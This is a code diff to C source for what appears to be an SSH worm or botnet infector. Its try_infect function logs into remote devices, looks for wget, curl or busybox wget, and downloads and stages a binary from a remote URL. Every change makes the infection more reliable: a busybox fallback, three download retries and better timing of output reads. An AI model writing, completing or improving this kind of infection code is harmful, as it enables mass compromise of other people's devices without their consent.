@@ -769,17 +769,43 @@ static int ssh_exec_logged(rawssh_session *ses, const char *cmd, char *out, int 
     int total = 0;
     int rd;
     char buf[512];
+    int fast_zero = 0;   /* counts zero-reads that returned instantly (EOF) */
+    int slow_zero = 0;   /* counts zero-reads from poll timeout (waiting for data) */
 
-    for (int i = 0; i < 80; i++) {
+    for (int i = 0; i < 300; i++) {
+        struct timespec t0, t1;
+        clock_gettime(CLOCK_MONOTONIC, &t0);
         rd = rawssh_channel_read(c, buf, sizeof(buf) - 1);
+        clock_gettime(CLOCK_MONOTONIC, &t1);
+        double read_ms = (t1.tv_sec - t0.tv_sec) * 1000.0 +
+                         (t1.tv_nsec - t0.tv_nsec) / 1000000.0;
+
         if (rd > 0) {
             buf[rd] = 0;
+            fast_zero = 0;
+            slow_zero = 0;
             if (total + rd < sz) {
                 memcpy(out + total, buf, rd);
                 total += rd;
             }
+        } else if (rd == 0) {
+            if (read_ms < 50.0) {
+                /* Returned 0 instantly → channel already received EOF/CLOSE.
+                   No point in waiting further — command is done. */
+                fast_zero++;
+                if (fast_zero >= 2)
+                    break;
+            } else {
+                /* Returned 0 after a long poll → command still running,
+                   just no output yet (e.g. during sleep 2/3 in the command).
+                   Keep waiting up to ~20 poll cycles. */
+                fast_zero = 0;
+                slow_zero++;
+                if (slow_zero >= 20)
+                    break;  /* safety limit */
+            }
         } else {
-            break;
+            break;  /* negative = error */
         }
     }
     out[total] = 0;
@@ -853,13 +879,21 @@ static void try_infect(rawssh_session *ses, Result *r) {
         return;
     }
 
-    /* Need wget or curl */
+    /* Need wget or curl — also try busybox wget as last resort */
     if (!r->has_wget && !r->has_curl) {
-        log_infect(r->ip, r->port, "ABORT: neither wget nor curl available, cannot download");
-        log_infect(r->ip, r->port, "=== INFECT ABORTED (no downloader) ===");
-        log_infect(r->ip, r->port, "================================================================");
-        atomic_fetch_add(&G_infect_fail, 1);
-        return;
+        /* Some devices have busybox wget but `which` can't find it */
+        char bbchk[128] = {0};
+        ssh_exec_cmd(ses, "busybox wget --help 2>&1 | head -1 && echo BBWGET_YES || echo BBWGET_NO", bbchk, sizeof(bbchk));
+        if (strstr(bbchk, "BBWGET_YES") || strstr(bbchk, "Usage") || strstr(bbchk, "wget")) {
+            r->has_wget = 1;
+            log_infect(r->ip, r->port, "  busybox wget detected as fallback downloader");
+        } else {
+            log_infect(r->ip, r->port, "ABORT: neither wget nor curl available, cannot download");
+            log_infect(r->ip, r->port, "=== INFECT ABORTED (no downloader) ===");
+            log_infect(r->ip, r->port, "================================================================");
+            atomic_fetch_add(&G_infect_fail, 1);
+            return;
+        }
     }
 
     /* Need bin_suffix */
@@ -946,18 +980,41 @@ static void try_infect(rawssh_session *ses, Result *r) {
     log_infect(r->ip, r->port, "  Destination: %s", full_path);
     log_infect(r->ip, r->port, "  Method: %s", r->has_wget ? "wget" : "curl");
     char dl_cmd[1024];
-    if (r->has_wget) {
-        snprintf(dl_cmd, sizeof(dl_cmd),
-                 "wget -O '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
-    } else {
-        snprintf(dl_cmd, sizeof(dl_cmd),
-                 "curl -v -o '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
-    }
-    char dl_buf[4096] = {0};
-    int dr = ssh_exec_logged(ses, dl_cmd, dl_buf, sizeof(dl_buf), r->ip, r->port, "DOWNLOAD");
+    char dl_buf[8192] = {0};
+    int dl_ok = 0;
 
-    if (!strstr(dl_buf, "DL_EXIT=0")) {
-        log_infect(r->ip, r->port, "ABORT: download failed (DL_EXIT=0 not found in output)");
+    /* Try download up to 3 times */
+    for (int dl_try = 0; dl_try < 3 && !dl_ok; dl_try++) {
+        if (dl_try > 0) {
+            log_infect(r->ip, r->port, "  Retry download attempt %d/3...", dl_try + 1);
+            /* Clean up partial file before retry */
+            char retry_rm[512];
+            snprintf(retry_rm, sizeof(retry_rm), "rm -f '%s' 2>/dev/null", full_path);
+            char retry_rm_buf[64] = {0};
+            ssh_exec_cmd(ses, retry_rm, retry_rm_buf, sizeof(retry_rm_buf));
+        }
+
+        memset(dl_buf, 0, sizeof(dl_buf));
+        if (r->has_curl) {
+            /* Use curl without -v to reduce output size and avoid read truncation */
+            snprintf(dl_cmd, sizeof(dl_cmd),
+                     "curl -sS -o '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
+        } else {
+            snprintf(dl_cmd, sizeof(dl_cmd),
+                     "wget -O '%s' '%s' 2>&1; echo DL_EXIT=$?", full_path, bin_url);
+        }
+
+        int dr = ssh_exec_logged(ses, dl_cmd, dl_buf, sizeof(dl_buf), r->ip, r->port, "DOWNLOAD");
+
+        if (strstr(dl_buf, "DL_EXIT=0")) {
+            dl_ok = 1;
+        } else {
+            log_infect(r->ip, r->port, "  Download attempt %d failed (DL_EXIT=0 not found, got %d bytes output)", dl_try + 1, dr);
+        }
+    }
+
+    if (!dl_ok) {
+        log_infect(r->ip, r->port, "ABORT: download failed after 3 attempts (DL_EXIT=0 never found)");
         log_infect(r->ip, r->port, "=== INFECT ABORTED (download failed) ===");
         log_infect(r->ip, r->port, "================================================================");
         atomic_fetch_add(&G_infect_fail, 1);
